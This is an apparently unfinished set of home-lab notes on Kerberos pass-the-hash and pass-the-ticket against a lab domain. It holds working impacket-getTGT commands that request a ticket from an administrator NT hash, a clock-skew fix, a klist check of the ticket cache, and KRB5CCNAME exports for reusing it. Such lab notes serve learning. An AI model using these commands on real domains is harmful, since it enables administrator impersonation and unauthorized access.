

let suppose we have a cache ticket 

getTGT.py -hashes :NThash $DOMAIN/$USER@$TARGET

let uppose we got a ticket uing the below command


                                                                                                                                                
┌──(kali㉿kali)-[~/HTB-machine/Faraday/rootkit/Reptile]
└─$ impacket-getTGT -no-pass -hashes :f1c3f58541c936fd550482ec578f102e furious.local/'administrator'@192.168.129.140 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
                                                                                                                                                 
┌──(kali㉿kali)-[~/HTB-machine/Faraday/rootkit/Reptile]
└─$ sudo ntpdate 192.168.129.140                                         
sudo: unable to resolve host kali: Name or service not known
[sudo] password for kali: 
2025-05-03 04:30:40.701475 (-0400) -1227.391532 +/- 0.001696 192.168.129.140 s1 no-leap
CLOCK: time stepped by -1227.391532
                                  

                                  
└─$ impacket-getTGT -no-pass -hashes :f1c3f58541c936fd550482ec578f102e furious.local/'administrator'@192.168.129.140 


Now we check the time the ticket is valid

                                                                                                                                                 
┌──(kali㉿kali)-[~/Home-lab/Kerbrose/pass-the-ticket]
└─$ ls                        
administrator@192.168.129.140.ccache
                                                                                                                                                 
┌──(kali㉿kali)-[~/Home-lab/Kerbrose/pass-the-ticket]
└─$ klist -c administrator@192.168.129.140.ccache

Ticket cache: FILE:administrator@192.168.129.140.ccache
Default principal: administrator@FURIOUS.LOCAL

Valid starting       Expires              Service principal
05/03/2025 00:20:09  05/03/2025 10:20:09  krbtgt/FURIOUS.LOCAL@FURIOUS.LOCAL
        renew until 05/04/2025 00:20:07


sp it is valid for 1 day

Now we use KRB5CCNAME variable

export KRB5CCNAME=...	Tells tools to use a specific .ccache Kerberos ticket file


export KRB5CCNAME=administrator@192.168.129.140.ccache

or

export KRB5CCNAME=$PWD/administrator@192.168.129.140.ccache



# Not completed yet


## this also a pass the cache

